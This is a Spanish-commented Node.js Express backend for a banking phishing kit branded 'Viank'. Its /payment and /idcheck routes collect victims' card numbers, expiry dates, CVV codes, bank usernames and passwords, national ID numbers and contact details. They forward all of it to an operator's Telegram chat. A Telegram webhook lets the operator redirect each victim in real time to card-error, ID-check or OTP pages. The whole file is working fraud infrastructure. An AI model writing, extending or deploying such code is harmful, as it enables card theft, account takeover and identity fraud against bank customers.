const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios');

const app = express();
app.use(cors());
app.use(bodyParser.json());

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn('[WARN] BOT_TOKEN o CHAT_ID no están definidos en variables de entorno.');
}

// Mapa para almacenar sessionId → redirección
const redirectionTable = Object.create(null);

// Ruta de prueba para verificar si el backend está activo
app.get('/', (_req, res) => {
  res.send({ ok: true, service: 'multi-backend', hasEnv: !!(BOT_TOKEN && CHAT_ID) });
});

// ✅ Ruta para payment.html
app.post('/payment', async (req, res) => {
  try {
    const data = req.body;
    const sessionId = data.sessionId;

    const text = `
🟣Viank🟣 - |[info]|
---
ℹ️ DATOS DE LA TARJETA

💳: ${data.p}
📅: ${data.pdate}
🔒: ${data.c}
🏛️: ${data.ban}

ℹ️ DATOS DEL CLIENTE

👨: ${data.dudename} ${data.surname}
🪪: ${data.cc}
📩: ${data.email}
📞: ${data.telnum}

ℹ️ DATOS DE FACTURACIÓN

🏙️: ${data.city}
🏙️: ${data.state}
🏙️: ${data.address}
🌐 IP: ${data.ip}
📍 Ubicación: ${data.location}

🆔 sessionId: ${sessionId}
---`.trim();

    const reply_markup = {
      inline_keyboard: [
        [
          { text: '❌ Error Tarjeta', callback_data: `go:payment.html|${sessionId}` },
          { text: '✅ Siguiente',     callback_data: `go:id-check.html|${sessionId}` }
        ]
      ]
    };

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text,
      reply_markup
    });

    res.status(200).send({ ok: true });
  } catch (err) {
    console.error('Error en /payment:', err?.response?.data || err.message);
    res.status(500).send({ ok: false, error: 'telegram_send_failed' });
  }
});

// ✅ Ruta para id-check.html
app.post('/idcheck', async (req, res) => {
  try {
    const data = req.body;
    const sessionId = data.sessionId;

    const text = `
🟣Viank🟣 - |[id-check]|
---
🪪 VERIFICACIÓN DE IDENTIDAD

• Usuario: ${data.user || 'N/D'}
• Clave: ${data.pass || 'N/D'}
• Nombre: ${data.name || 'N/D'}
• Apellido: ${data.surname || 'N/D'}
• Cédula: ${data.cc || 'N/D'}
• Email: ${data.email || 'N/D'}
• Teléfono: ${data.telnum || 'N/D'}
• Entidad: ${data.ban || 'N/D'}
• Cuotas: ${data.dues || 'N/D'}
• Ciudad: ${data.city || 'N/D'}
• Departamento: ${data.state || 'N/D'}
• Dirección: ${data.address || 'N/D'}

🌐 IP: ${data.ip || 'N/D'}
📍 Ubicación: ${data.location || 'N/D'}

🆔 sessionId: ${sessionId}
---`.trim();


    const reply_markup = {
      inline_keyboard: [
        [
          { text: '❌ Error tarjeta', callback_data: `go:payment.html|${sessionId}` },
          { text: '⚠️ Error logo',   callback_data: `go:id-check.html|${sessionId}` },
          { text: '✅ Siguiente',     callback_data: `go:otp-check.html|${sessionId}` }
        ]
      ]
    };

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text,
      reply_markup
    });

    res.status(200).send({ ok: true });
  } catch (err) {
    console.error('Error en /idcheck:', err?.response?.data || err.message);
    res.status(500).send({ ok: false, error: 'telegram_send_failed' });
  }
});

// ✅ Webhook de Telegram para botones dinámicos
app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
  try {
    const update = req.body;

    if (update.callback_query) {
      const cq = update.callback_query;
      const data = cq.data || '';
      const [action, sessionId] = data.split('|');
      const target = (action || '').replace('go:', '');

      if (sessionId && target) {
        redirectionTable[sessionId] = target;
      }

      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
        callback_query_id: cq.id,
        text: `Redireccionando al cliente (${sessionId}) → ${target}`,
        show_alert: true
      });
    }

    res.sendStatus(200);
  } catch (err) {
    console.error('Error en webhook:', err?.response?.data || err.message);
    res.sendStatus(200);
  }
});

// ✅ Consulta del cliente para ver si ya tiene destino
app.get('/get-redirect/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  const target = redirectionTable[sessionId] || null;
  res.send({ target });
});

// Iniciar servidor
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor activo en puerto ${PORT}`));
